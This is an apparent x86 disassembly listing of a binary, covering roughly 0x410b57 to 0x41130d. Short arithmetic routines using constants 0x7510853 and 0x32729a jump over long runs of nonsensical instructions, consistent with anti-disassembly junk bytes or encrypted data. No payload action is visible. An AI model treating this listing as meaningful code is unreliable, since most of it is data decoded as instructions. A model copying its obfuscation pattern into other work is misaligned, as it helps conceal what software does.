  410b57:	fbld   TBYTE PTR ds:0xd42dc3ca
  410b5d:	jne    0x410bc8
  410b5f:	jns    0x410b0c
  410b61:	add    DWORD PTR [ecx-0x6a42847b],edi
  410b67:	sub    ecx,edi
  410b69:	pusha  
  410b6a:	mov    ds,WORD PTR [ebp+0x40]
  410b6d:	jmp    0x410b78
  410b6f:	int3   
  410b70:	aam    0x83
  410b72:	sbb    BYTE PTR [eax+esi*1-0x3d2042b],al
  410b79:	push   ecx
  410b7a:	fucomp st(3)
  410b7c:	fldenv [edx+0x7a]
  410b7f:	retf   0x1748
  410b82:	dec    edi
  410b83:	xchg   edi,eax
  410b84:	in     al,dx
  410b85:	mov    al,ds:0x684f2f96
  410b8a:	xor    eax,0x6516ca6a
  410b8f:	cmp    ah,0xe5
  410b92:	aaa    
  410b93:	int    0x67
  410b95:	fadd   DWORD PTR [edi-0x50]
  410b98:	cli    
  410b99:	cli    
  410b9a:	xchg   edi,eax
  410b9b:	inc    ebp
  410b9c:	adc    DWORD PTR [esi+0x2],edi
  410b9f:	push   ss
  410ba0:	adc    eax,0x9fe7939f
  410ba5:	mov    ds:0xf6e90945,al
  410baa:	mov    bh,0xb0
  410bac:	xlat   BYTE PTR ds:[ebx]
  410bad:	push   ss
  410bae:	outs   dx,DWORD PTR ds:[esi]
  410baf:	mov    bh,0xba
  410bb1:	fs dec eax
  410bb3:	mov    bl,0x0
  410bb5:	pminub mm5,mm2
  410bb8:	or     ecx,DWORD PTR [ecx+0x2784b92b]
  410bbe:	xlat   BYTE PTR ds:[ebx]
  410bbf:	neg    cl
  410bc1:	inc    ecx
  410bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bc3:	popf   
  410bc4:	mov    ecx,0x39958c73
  410bc9:	sub    bl,BYTE PTR [eax+0x77394022]
  410bcf:	mov    dl,0x2e
  410bd1:	inc    ebx
  410bd2:	out    dx,al
  410bd3:	sbb    ecx,DWORD PTR [esi-0x47]
  410bd6:	mov    bh,0x24
  410bd8:	call   0xaab016d9
  410bdd:	cli    
  410bde:	scas   eax,DWORD PTR es:[edi]
  410bdf:	inc    ecx
  410be0:	gs cwde 
  410be2:	mov    ax,0xa97f
  410be6:	jl     0x410c3e
  410be8:	and    BYTE PTR [eax-0x45],0x66
  410bec:	fidivr DWORD PTR [edi]
  410bee:	rol    BYTE PTR [ecx+0x2c],cl
  410bf1:	aas    
  410bf2:	ret    0x9c
  410bf5:	(bad)  
  410bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bf7:	in     eax,dx
  410bf8:	adc    eax,DWORD PTR [edi+0x1b]
  410bfb:	mov    bl,0xd1
  410bfe:	and    eax,0x300d601e
  410c03:	and    al,0x69
  410c05:	gs mov cl,0x3
  410c08:	cli    
  410c09:	sub    DWORD PTR [edi],0x54
  410c0c:	js     0x410c20
  410c0e:	dec    eax
  410c0f:	push   esi
  410c10:	mov    dl,0xd2
  410c12:	icebp  
  410c13:	aaa    
  410c14:	pop    ecx
  410c15:	shr    BYTE PTR fs:0x496c64ea,1
  410c1c:	pop    ebx
  410c1d:	xchg   ebx,ecx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c86:	lahf   
  410c87:	aad    0x48
  410c89:	aaa    
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410c34
  410c92:	inc    esp
  410c93:	lahf   
  410c94:	sbb    edx,ebp
  410c96:	lds    edi,FWORD PTR [eax+0x72]
  410c99:	jmp    0x410cfc
  410c9b:	adc    DWORD PTR [ebp+0x68724121],0xffffff94
  410ca2:	cmp    dh,BYTE PTR ds:[ecx+0x5b]
  410ca6:	int3   
  410ca7:	xor    al,BYTE PTR [ebx+0x680ee49]
  410cad:	push   ebp
  410cae:	cmc    
  410caf:	fimul  DWORD PTR [ebx+ebp*2-0x74]
  410cb3:	hlt    
  410cb4:	cwde   
  410cb5:	push   edi
  410cb6:	dec    edi
  410cb7:	dec    esi
  410cb8:	sbb    BYTE PTR [ecx],cl
  410cba:	push   ds
  410cbb:	pop    ecx
  410cbc:	adc    bl,BYTE PTR [edx]
  410cbe:	inc    ebp
  410cbf:	retf   
  410cc0:	test   eax,0xd839326d
  410cc5:	xor    dl,0x97
  410cc8:	pop    edi
  410cc9:	sub    edi,DWORD PTR [edi]
  410ccb:	sbb    BYTE PTR [edx],0x1e
  410cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ccf:	stos   BYTE PTR es:[edi],al
  410cd0:	retf   0x70ac
  410cd3:	fstp   st(0)
  410cd5:	in     al,dx
  410cd6:	push   ds
  410cd7:	out    0x68,al
  410cd9:	stos   BYTE PTR es:[edi],al
  410cda:	test   BYTE PTR [ecx-0x5b669834],dl
  410ce0:	in     al,dx
  410ce1:	and    ecx,DWORD PTR [eax-0x26]
  410ce4:	mov    ch,0x12
  410ce6:	xchg   ebx,eax
  410ce7:	xchg   edx,eax
  410ce8:	xchg   edi,eax
  410ce9:	jno    0x410d4f
  410ceb:	shl    ebp,cl
  410ced:	dec    eax
  410cee:	sbb    al,0xe
  410cf0:	push   ds
  410cf1:	inc    eax
  410cf2:	aam    0xac
  410cf4:	or     cl,BYTE PTR [esi+0x51]
  410cf7:	mov    WORD PTR [eax+eax*1-0x5c],ds
  410cfb:	in     al,0x54
  410cfd:	adc    BYTE PTR [esi-0x1d],0x31
  410d01:	lahf   
  410d02:	shl    BYTE PTR [eax-0x43],cl
  410d05:	lods   eax,DWORD PTR ds:[esi]
  410d06:	add    eax,0x9e830fde
  410d0b:	pop    esi
  410d0c:	scas   al,BYTE PTR es:[edi]
  410d0d:	lock add BYTE PTR [ebx],bh
  410d10:	repz test BYTE PTR ds:[eax-0x433f92a5],bl
  410d18:	and    cl,BYTE PTR [eax+0x3f]
  410d1b:	test   eax,0xa4aed44
  410d20:	(bad)  
  410d21:	fdiv   QWORD PTR [ebx]
  410d23:	ins    BYTE PTR es:[edi],dx
  410d24:	jmp    0x5382ff7e
  410d29:	rcl    BYTE PTR [eax-0x553648c0],cl
  410d2f:	cmp    bh,BYTE PTR [edi+0x6c]
  410d32:	inc    ecx
  410d33:	jae    0x410d74
  410d35:	sbb    BYTE PTR [ecx],cl
  410d37:	inc    edx
  410d38:	(bad)  
  410d39:	loop   0x410d66
  410d3b:	ret    0xeacf
  410d3e:	mov    ecx,0x3ff3e9dc
  410d43:	iret   
  410d44:	mov    ds:0xa1171e2f,al
  410d49:	sub    al,0xe1
  410d4b:	arpl   WORD PTR [ebx-0x331ba74c],ax
  410d51:	test   al,0xbd
  410d53:	aaa    
  410d54:	mov    ?,edx
  410d56:	scas   al,BYTE PTR es:[edi]
  410d57:	mov    eax,0xe52e69f9
  410d5c:	ret    0x871c
  410d5f:	ret    
  410d60:	or     eax,0xc08d5d6
  410d65:	pop    ebx
  410d66:	popf   
  410d67:	add    DWORD PTR [ebx],ecx
  410d69:	fwait
  410d6a:	sbb    ebp,edx
  410d6c:	xlat   BYTE PTR ds:[ebx]
  410d6d:	jnp    0x410d14
  410d6f:	pop    ss
  410d70:	mov    al,ds:0x328b6ca1
  410d75:	ja     0x410d49
  410d77:	stc    
  410d78:	inc    edi
  410d79:	cld    
  410d7a:	sub    esi,DWORD PTR [ebx]
  410d7c:	or     bl,BYTE PTR [ebp-0x71]
  410d7f:	cmp    BYTE PTR [ecx-0x3c],ch
  410d82:	sbb    eax,0x4000b92
  410d87:	(bad)  [edx+0x3f6155ab]
  410d8d:	and    ah,bh
  410d8f:	sbb    dl,BYTE PTR [edx]
  410d91:	neg    BYTE PTR [edx-0x603fee80]
  410d97:	add    eax,0x97824e3b
  410d9c:	xchg   ebx,eax
  410d9d:	or     eax,0xda4c1acb
  410da2:	ret    0x16c8
  410da5:	jno    0x410d57
  410da7:	leave  
  410da8:	and    eax,0x604ccdb9
  410dad:	xchg   ebp,eax
  410dae:	fstp   TBYTE PTR [ecx+0x7510853]
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx+0x6c553a00],esi
  410e04:	mov    ds:0x7c7c47d5,al
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410e83
  410e0e:	add    ah,BYTE PTR [esp+eiz*2]
  410e11:	(bad)  
  410e12:	icebp  
  410e13:	lock ss aas 
  410e16:	pop    ss
  410e17:	scas   al,BYTE PTR es:[edi]
  410e18:	push   0x2c
  410e1a:	std    
  410e1b:	inc    esp
  410e1c:	jb     0x410de5
  410e1e:	inc    esp
  410e1f:	rcl    edi,1
  410e21:	adc    ecx,DWORD PTR [ebx-0x5d]
  410e24:	ds mov ecx,0xd26e2d05
  410e2a:	aam    0x26
  410e2c:	cwde   
  410e2d:	xor    edi,ebx
  410e2f:	ss jae 0x410e0b
  410e32:	fisubr DWORD PTR [edx*8-0x69441901]
  410e39:	jmp    0x410e1c
  410e3b:	xor    eax,0xb7a12834
  410e40:	sub    ebx,DWORD PTR [eax+0x5b875d29]
  410e46:	cmc    
  410e47:	push   ss
  410e48:	sub    bh,BYTE PTR [ecx-0x11a30c84]
  410e4e:	jo     0x410eb3
  410e50:	sub    bh,ah
  410e52:	scas   al,BYTE PTR es:[edi]
  410e53:	adc    BYTE PTR [edi-0x5f],ah
  410e56:	ins    DWORD PTR es:[edi],dx
  410e57:	test   BYTE PTR [ebx],0xa5
  410e5a:	es rol ecx,1
  410e5d:	leave  
  410e5e:	push   esp
  410e5f:	outs   dx,BYTE PTR ds:[esi]
  410e60:	mov    DWORD PTR [edi+ebp*1],edi
  410e63:	je     0x410ebd
  410e65:	pop    edx
  410e66:	in     al,dx
  410e67:	dec    esi
  410e68:	push   ecx
  410e69:	repnz cmc 
  410e6b:	mov    edi,0xc63775ca
  410e70:	cmc    
  410e71:	push   edi
  410e72:	iret   
  410e73:	(bad)  
  410e74:	fdivr  DWORD PTR [edi+0x7]
  410e77:	jae    0x410e69
  410e79:	aam    0x49
  410e7b:	jb     0x410edd
  410e7d:	ins    DWORD PTR es:[edi],dx
  410e7e:	and    DWORD PTR [eax-0x5b],0x7e
  410e82:	js     0x410e3e
  410e84:	loop   0x410eec
  410e86:	icebp  
  410e87:	and    eax,0xa6554fba
  410e8c:	fidiv  WORD PTR [edi+ebx*2]
  410e8f:	jns    0x410e72
  410e91:	adc    DWORD PTR [esi-0x2449637],esi
  410e97:	mov    ds:0x9a7bb2b3,eax
  410e9c:	into   
  410e9d:	jne    0x410e8a
  410e9f:	pushf  
  410ea0:	cmp    ebx,DWORD PTR [eax+0x53]
  410ea3:	lahf   
  410ea4:	pop    ebp
  410ea5:	fdiv   st,st(7)
  410ea7:	test   bh,ah
  410ea9:	retf   0xda23
  410eac:	das    
  410ead:	test   al,0xa1
  410eaf:	imul   esi,DWORD PTR [edx+0xc],0x33bff773
  410eb6:	cmp    DWORD PTR [esi+0x25b89976],0x5c
  410ebd:	mov    ds:0x779f7444,eax
  410ec2:	cmp    eax,0x96471ed0
  410ec7:	add    DWORD PTR [edi],0x2
  410eca:	dec    esi
  410ecb:	xchg   ebp,eax
  410ecc:	iret   
  410ecd:	fiadd  DWORD PTR [edi+0x2791ee91]
  410ed3:	sete   bl
  410ed6:	retf   0x54ff
  410ed9:	mov    dl,dl
  410edb:	std    
  410edc:	dec    eax
  410edd:	stos   DWORD PTR es:[edi],eax
  410ede:	imul   BYTE PTR [ebx+0x65a3ea7d]
  410ee4:	xchg   DWORD PTR [ecx],edx
  410ee6:	test   al,0x1b
  410ee8:	stc    
  410ee9:	lea    esp,[edi-0x7b075cc6]
  410eef:	mov    edx,0xb7b26563
  410ef4:	jle    0x410ec2
  410ef6:	lods   eax,DWORD PTR ds:[esi]
  410ef7:	mov    ebp,0x26ee03a
  410efc:	outs   dx,BYTE PTR ds:[esi]
  410efd:	jb     0x410f4e
  410eff:	mov    bh,0x26
  410f01:	mov    eax,ds:0x97019585
  410f06:	pusha  
  410f07:	out    dx,al
  410f08:	loopne 0x410f10
  410f0a:	mov    bl,0x38
  410f0c:	es ja  0x410f1a
  410f0f:	pop    ecx
  410f10:	adc    esi,esi
  410f12:	jg     0x410f23
  410f14:	push   ss
  410f15:	mov    eax,ds:0x55e3c7d7
  410f1a:	(bad)  
  410f1b:	mov    BYTE PTR [ebp+edi*1-0x50b3694f],al
  410f22:	fdiv   st(4),st
  410f24:	ins    BYTE PTR es:[edi],dx
  410f25:	cmp    BYTE PTR [edi-0x6aab1038],ah
  410f2b:	add    eax,esi
  410f2d:	imul   eax,DWORD PTR [edx]
  410f30:	mov    edx,DWORD PTR [ebp-0x4]
  410f33:	xor    edx,ecx
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f4a:	jge    0x410ed4
  410f4c:	push   ds
  410f4d:	jmp    0x410f95
  410f4f:	jl     0x410fcd
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410fd4
  410f56:	les    ebx,FWORD PTR [ecx+0x7958986c]
  410f5c:	jns    0x410f02
  410f5e:	test   al,0x1f
  410f60:	adc    dh,bh
  410f62:	test   al,0x1
  410f64:	(bad)  
  410f65:	dec    edx
  410f66:	cwde   
  410f67:	js     0x410f82
  410f69:	cmp    edx,edx
  410f6b:	repz and al,0x1c
  410f6e:	cs push 0x4b
  410f71:	jmp    0x98be:0x30b61ff9
  410f78:	jmp    0x51b1:0x6da72238
  410f7f:	ret    
  410f80:	adc    BYTE PTR [edi],ah
  410f82:	or     BYTE PTR [edx-0x66],al
  410f85:	push   eax
  410f86:	enter  0x2e7f,0xab
  410f8a:	push   ecx
  410f8b:	push   0x59
  410f8d:	shl    DWORD PTR [edx-0x3c],1
  410f90:	scas   eax,DWORD PTR es:[edi]
  410f91:	std    
  410f92:	cmc    
  410f93:	int3   
  410f94:	cs jp  0x410f3e
  410f97:	outs   dx,BYTE PTR cs:[esi]
  410f99:	jge    0x410f62
  410f9b:	callw  0x9eee
  410f9f:	ja     0x410f37
  410fa1:	jmp    0x410f6a
  410fa3:	add    al,0x7a
  410fa5:	jmp    0xa747:0xdcdb879c
  410fac:	test   al,0xd9
  410fae:	hlt    
  410faf:	rcl    BYTE PTR [edx-0x299c3fe8],0x9
  410fb6:	pop    esi
  410fb7:	mov    esp,0x978cfadf
  410fbc:	mov    eax,ds:0x22a2b49f
  410fc1:	sbb    dh,BYTE PTR [ecx+edi*4]
  410fc4:	and    eax,0x473c02b8
  410fc9:	test   DWORD PTR [edi-0x22],esi
  410fcc:	pop    esp
  410fcd:	fisubr WORD PTR [esi+0x7c]
  410fd0:	lea    edx,[esi-0x25]
  410fd3:	outs   dx,BYTE PTR ds:[esi]
  410fd4:	lds    ebp,FWORD PTR [ecx+eiz*4-0x64f01ffc]
  410fdb:	sbb    dh,dh
  410fdd:	mov    dl,0x7b
  410fdf:	(bad)  
  410fe0:	cli    
  410fe1:	dec    edx
  410fe2:	mov    BYTE PTR [edx+0x75f987cb],dl
  410fe8:	in     al,0xa6
  410fea:	xor    eax,0xb02486ac
  410fef:	pop    edi
  410ff0:	into   
  410ff1:	pop    di
  410ff3:	jae    0x410f7f
  410ff5:	push   ss
  410ff6:	daa    
  410ff7:	repnz or ah,BYTE PTR [edi-0x25]
  410ffb:	lods   al,BYTE PTR ds:[esi]
  410ffc:	enter  0x9c00,0x67
  411000:	fcmovnbe st,st(1)
  411002:	dec    eax
  411003:	mov    dh,0x80
  411005:	dec    ebp
  411006:	std    
  411007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411008:	xchg   esp,eax
  411009:	addr16 mov dl,0x7
  41100c:	out    dx,al
  41100d:	mov    bh,0x99
  41100f:	xor    BYTE PTR [edx+0x7d],dl
  411012:	iret   
  411013:	cmp    al,0x73
  411015:	pop    ebx
  411016:	in     eax,0x7d
  411018:	int    0x6d
  41101a:	pop    edi
  41101b:	sub    ecx,DWORD PTR [eax]
  41101d:	inc    ebx
  41101e:	jns    0x411004
  411020:	and    edi,DWORD PTR [ecx-0x68685f80]
  411026:	or     al,0x37
  411028:	mov    ah,0x45
  41102a:	dec    eax
  41102b:	xor    eax,0x287aaade
  411030:	pop    ss
  411031:	add    eax,0x418a80e0
  411036:	inc    edi
  411037:	jno    0x411054
  411039:	and    al,0xa7
  41103b:	out    0x1b,eax
  41103d:	xor    BYTE PTR [esi+0x5a],bl
  411040:	pop    esp
  411041:	gs mov edi,0x9a1bf876
  411047:	rol    BYTE PTR [edi],1
  411049:	pop    esi
  41104a:	rcl    BYTE PTR [esi-0x79],cl
  41104d:	push   esi
  41104e:	or     al,0x1f
  411050:	scas   al,BYTE PTR es:[edi]
  411051:	mov    dl,0x8
  411053:	fwait
  411054:	pop    ecx
  411055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411056:	adc    ecx,DWORD PTR [edx+0x5b]
  411059:	push   esp
  41105a:	jmp    0x5d9f:0xa0095997
  411061:	push   eax
  411062:	sbb    ebx,ecx
  411064:	adc    dh,BYTE PTR [esi-0xb7952b5]
  41106a:	pop    ds
  41106b:	sahf   
  41106c:	push   ss
  41106d:	sbb    eax,0xbc39c566
  411072:	arpl   WORD PTR [ebp+0x729a0a8c],cx
  411078:	xor    al,BYTE PTR [eax]
  41107a:	cmp    ecx,eax
  41107c:	jne    0x410c67
  411082:	mov    ebx,esi
  411084:	jmp    0x41108e
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	or     esp,esi
  4110b3:	pusha  
  4110b4:	xchg   BYTE PTR [ecx+0x127c7c41],cl
  4110ba:	jg     0x411138
  4110bc:	jl     0x41110d
  4110be:	jae    0x41111c
  4110c0:	loop   0x411058
  4110c2:	data16 add BYTE PTR [ecx+0x51],dl
  4110c6:	mov    WORD PTR [ebx-0x16],ss
  4110c9:	sub    BYTE PTR [ecx],0xb4
  4110cc:	pop    ss
  4110cd:	mov    DWORD PTR [edx],esp
  4110cf:	sbb    eax,0x53c16671
  4110d4:	xchg   edi,eax
  4110d5:	fnstsw WORD PTR [ecx-0x62b4021]
  4110db:	push   cs
  4110dc:	imul   ecx,DWORD PTR [ebx],0x96f58c84
  4110e2:	mov    esi,esi
  4110e4:	mov    al,ds:0xd88ed2e4
  4110e9:	jno    0xac8317f1
  4110ef:	jo     0x411106
  4110f1:	int3   
  4110f2:	mov    esp,0xfbf98f89
  4110f7:	pop    es
  4110f8:	loope  0x411109
  4110fa:	popa   
  4110fb:	dec    ebx
  4110fc:	comiss xmm0,xmm0
  4110ff:	dec    esi
  411100:	jne    0x4110b2
  411102:	fucomip st,st(1)
  411104:	push   ebx
  411105:	rcl    esi,0xd
  411108:	gs scas eax,DWORD PTR es:[edi]
  41110a:	xor    al,0xd6
  41110c:	xchg   ebp,eax
  41110d:	cmp    bl,cl
  41110f:	add    BYTE PTR [ebx+0x3bfbb454],ah
  411115:	aaa    
  411116:	push   esp
  411117:	outs   dx,DWORD PTR ds:[esi]
  411118:	jl     0x411130
  41111a:	inc    BYTE PTR [ebx]
  41111c:	xchg   ecx,eax
  41111d:	shl    BYTE PTR [esi],1
  41111f:	adc    BYTE PTR [edx-0x16],dh
  411122:	ja     0x411111
  411124:	in     al,0x41
  411126:	jno    0x411105
  411128:	and    ebp,DWORD PTR [ebx+0x2f52b61e]
  41112e:	inc    ecx
  41112f:	imul   edi,DWORD PTR [edi-0x57609195],0x334a56b3
  411139:	mov    BYTE PTR [eax],ch
  41113b:	cmovb  esp,DWORD PTR [ebp+ebp*2-0xedacd45]
  411143:	adc    BYTE PTR [edi+0x70],dh
  411146:	in     eax,0x65
  411148:	cmp    eax,0x52d0ec7d
  41114d:	push   ds
  41114e:	or     eax,0xa47170e3
  411153:	fstp   QWORD PTR [edx+0x67]
  411156:	aas    
  411157:	jmp    0x41115c
  411159:	fisttp WORD PTR [edx-0x1cf281f8]
  41115f:	mov    WORD PTR [ecx],cs
  411161:	xor    edi,ebp
  411163:	ins    BYTE PTR es:[edi],dx
  411164:	pop    edi
  411165:	pushf  
  411166:	cld    
  411167:	shr    BYTE PTR [ebx],1
  411169:	inc    esi
  41116a:	pop    eax
  41116b:	jp     0x411111
  41116d:	pop    esi
  41116e:	jne    0x411145
  411170:	add    DWORD PTR [ecx+0x69],ebp
  411173:	ds xchg esi,eax
  411175:	popf   
  411176:	and    eax,0xf86c0b98
  41117b:	in     al,dx
  41117c:	sub    BYTE PTR [ebp-0x54],ah
  41117f:	jp     0x4111c0
  411181:	icebp  
  411182:	daa    
  411183:	int3   
  411184:	(bad)  
  411185:	jne    0x4111ae
  411187:	xor    ebp,edx
  411189:	test   DWORD PTR [ebp+0x24],edx
  41118c:	ins    DWORD PTR es:[edi],dx
  41118d:	xchg   edx,eax
  41118e:	retf   0x9488
  411191:	fs aam 0xe6
  411194:	push   0xffffffc0
  411196:	cmp    eax,0x4a45017f
  41119b:	inc    ebp
  41119c:	jae    0x411127
  41119e:	fld    QWORD PTR [esi]
  4111a0:	imul   BYTE PTR [ecx+0x16]
  4111a3:	xor    DWORD PTR [ebx-0x2c],eax
  4111a6:	sbb    eax,0xfa6770cb
  4111ab:	shl    DWORD PTR ds:0x3cd85c12,0x9d
  4111b2:	pop    ds
  4111b3:	cmp    DWORD PTR [ecx-0x3],ecx
  4111b6:	cmp    al,0x66
  4111b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111b9:	or     al,BYTE PTR [ebp-0x5e]
  4111bc:	test   DWORD PTR [eax-0x2d],0xa29092f
  4111c3:	cmp    DWORD PTR [ecx+0x4a4ef63e],ecx
  4111c9:	mov    ecx,0x38411804
  4111ce:	push   esi
  4111cf:	scas   al,BYTE PTR es:[edi]
  4111d0:	mov    edi,0x7ecc6239
  4111d5:	int3   
  4111d6:	clc    
  4111d7:	fdivp  st(0),st
  4111d9:	jmp    FWORD PTR [edx-0x2c00e7fd]
  4111df:	xor    ebx,ebx
  4111e1:	inc    ebx
  4111e2:	cmp    DWORD PTR [ebp+0x10],ebx
  4111e5:	je     0x41133e
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0x435a,0x8d
  4111ff:	push   edi
  411200:	(bad)  
  411201:	scas   eax,DWORD PTR es:[edi]
  411202:	inc    eax
  411203:	jl     0x411281
  411205:	adc    bh,BYTE PTR [edi+0x7c]
  411208:	jl     0x4111e9
  41120a:	das    
  41120b:	push   eax
  41120c:	inc    esi
  41120d:	arpl   di,ax
  41120f:	cdq    
  411210:	retf   
  411211:	retf   0xd867
  411214:	pushf  
  411215:	dec    eax
  411216:	or     al,0xfe
  411218:	pop    ds
  411219:	push   ds
  41121a:	lods   eax,DWORD PTR ds:[esi]
  41121b:	aaa    
  41121c:	aaa    
  41121d:	(bad)  [eax]
  41121f:	xor    bl,BYTE PTR [esi+0x51]
  411222:	test   eax,0xeb54012b
  411227:	jno    0x41127b
  411229:	(bad)  [ebx+ebx*8+0x64]
  41122d:	out    0xf5,eax
  41122f:	popa   
  411230:	mov    DWORD PTR [ecx+0x61b8b51e],eax
  411236:	mov    bh,0x53
  411238:	cmp    DWORD PTR [ebp+0x26],edx
  41123b:	out    0x97,eax
  41123d:	xchg   edi,eax
  41123e:	pop    ds
  41123f:	pop    edi
  411240:	adc    BYTE PTR fs:[edi+0x4643b3c3],al
  411247:	xchg   esi,eax
  411248:	mov    ds:0xf494c7c8,al
  41124d:	or     DWORD PTR [ecx+0x41],ebx
  411250:	adc    bh,BYTE PTR [ecx]
  411252:	jecxz  0x411217
  411254:	jecxz  0x4112b8
  411256:	stos   BYTE PTR es:[edi],al
  411257:	loopne 0x411201
  411259:	sbb    al,0x72
  41125b:	addr16 mov al,0x34
  41125e:	mov    bl,0xa8
  411260:	sub    BYTE PTR [ebx+0x3d],bh
  411263:	xchg   ecx,eax
  411264:	fild   WORD PTR [esi+0x5431b99f]
  41126a:	test   al,0xc0
  41126c:	lds    ebp,FWORD PTR [esi]
  41126e:	pop    eax
  41126f:	rcr    DWORD PTR [edx+0x46],1
  411272:	bound  edi,QWORD PTR [edi+0x1e]
  411275:	jns    0x411241
  411277:	pop    esp
  411278:	xor    al,BYTE PTR [esi]
  41127a:	and    al,0xf
  41127c:	xchg   BYTE PTR [edi],ch
  41127e:	sbb    eax,0xa679a25e
  411283:	inc    esp
  411284:	inc    edx
  411285:	aad    0x83
  411287:	rcl    ecx,1
  411289:	and    al,0xff
  41128b:	(bad)  
  41128c:	and    eax,0x3a8197c9
  411291:	mov    dl,0xa2
  411293:	push   ecx
  411294:	adc    ch,BYTE PTR [ecx+0x20]
  411297:	push   ebp
  411298:	inc    edx
  411299:	dec    eax
  41129a:	xor    DWORD PTR [edx-0x62],edx
  41129d:	adc    eax,0x30fe0a74
  4112a2:	jmp    0xa1b2937f
  4112a7:	mov    dl,0x3b
  4112a9:	lock cmc 
  4112ab:	ins    DWORD PTR es:[edi],dx
  4112ac:	rol    DWORD PTR [edx+0x4d2303ae],1
  4112b2:	and    esp,DWORD PTR [edi-0x139a5f66]
  4112b8:	cmp    DWORD PTR gs:[edi-0x37],esp
  4112bc:	inc    BYTE PTR [edx+ebp*8-0xedb776b]
  4112c3:	sti    
  4112c4:	outs   dx,BYTE PTR ds:[esi]
  4112c5:	jg     0x4112f3
  4112c7:	test   al,0xf6
  4112c9:	fcomp  QWORD PTR [ebx-0x46]
  4112cc:	pop    esi
  4112cd:	fidiv  WORD PTR [ebx-0x3]
  4112d0:	icebp  
  4112d1:	iret   
  4112d2:	ret    
  4112d3:	addr16 icebp 
  4112d5:	jo     0x4112a2
  4112d7:	xor    DWORD PTR [esi],esp
  4112d9:	cmp    bl,BYTE PTR [edx]
  4112db:	(bad)  
  4112dc:	jae    0x4112e1
  4112de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112df:	add    esp,DWORD PTR [edi]
  4112e1:	jl     0x411289
  4112e3:	xor    eax,0xe3b11d33
  4112e8:	aas    
  4112e9:	cmp    BYTE PTR ds:0x2f183d9d,0x79
  4112f0:	push   cs
  4112f1:	in     al,0x3
  4112f3:	and    eax,0xaf190f23
  4112f8:	lods   al,BYTE PTR ds:[esi]
  4112f9:	fistp  DWORD PTR [ecx]
  4112fb:	rcr    BYTE PTR [esi+ebx*1-0x33259910],cl
  411302:	jno    0x41136c
  411304:	and    ebp,DWORD PTR [eax]
  411306:	xchg   BYTE PTR [edx+0x7d80af83],bl
  41130c:	pop    ebp
  41130d:	inc    edi
